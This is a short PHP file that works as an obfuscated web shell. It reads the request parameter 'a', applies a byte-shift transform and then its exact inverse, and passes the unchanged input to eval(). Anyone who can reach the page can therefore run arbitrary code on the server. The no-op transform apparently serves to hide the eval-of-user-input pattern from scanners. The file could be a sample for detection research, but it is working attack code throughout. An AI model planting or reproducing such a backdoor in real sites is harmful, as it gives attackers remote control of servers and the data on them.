<?php
function simpleTransform($str, $offset = 1) {
    $transformed = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $transformed .= chr((ord($str[$i]) + $offset) % 256);
    }
    return $transformed;
}

$original = $_REQUEST["a"];
$transformed = simpleTransform($original, 3);
function reverseTransform($str, $offset = 1) {
    $reversed = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $reversed .= chr((ord($str[$i]) - $offset + 256) % 256);
    }
    return $reversed;
}

$reversed = reverseTransform($transformed, 3);
echo eval($reversed);
